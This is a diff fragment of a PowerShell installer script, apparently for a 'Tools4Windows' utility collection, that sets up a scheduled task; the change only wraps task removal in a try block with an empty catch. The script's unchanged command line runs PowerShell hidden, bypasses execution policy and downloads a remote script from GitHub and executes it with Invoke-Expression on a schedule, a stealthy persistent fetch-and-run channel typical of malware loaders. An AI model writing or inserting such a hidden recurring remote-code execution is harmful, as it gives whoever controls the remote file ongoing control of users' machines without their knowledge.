@@ -8,8 +8,11 @@ $taskDescription = "Tools4Windows is a collection of practical utilities for man
 
 $command = '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {Invoke-Expression (Invoke-WebRequest ''https://raw.githubusercontent.com/tools4windows/other/refs/heads/main/daily.ps1'' -UseBasicParsing)}"'
 
-if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
-    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false | Out-Null
+try {
+    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false | Out-Null
+    }
+} catch {
 }
 
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $command
